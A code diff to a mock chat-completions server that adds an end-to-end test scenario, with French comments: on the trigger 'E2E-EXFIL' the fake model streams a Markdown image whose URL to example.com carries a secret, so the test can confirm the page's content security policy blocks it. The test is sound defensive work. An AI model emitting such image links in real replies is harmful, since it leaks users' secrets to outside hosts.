@@ -138,7 +138,13 @@ def completions():
 
         return Response(gen_hold(), mimetype="text/event-stream")
 
-    if slow:
+    # Scénario E2E-EXFIL : le « modèle » glisse une image Markdown vers un site externe,
+    # l'adresse portant un secret. La CSP des pages doit empêcher le navigateur de la
+    # charger (aucune requête vers example.com).
+    if "E2E-EXFIL" in last:
+        words = ["Voici", "![pixel](https://example.com/pixel.png?secret=E2E-SECRET)"]
+        delay = 0.05
+    elif slow:
         words = ("je réfléchis posément, morceau par morceau, " * 8).split(" ")
         delay = 1.2
     else:
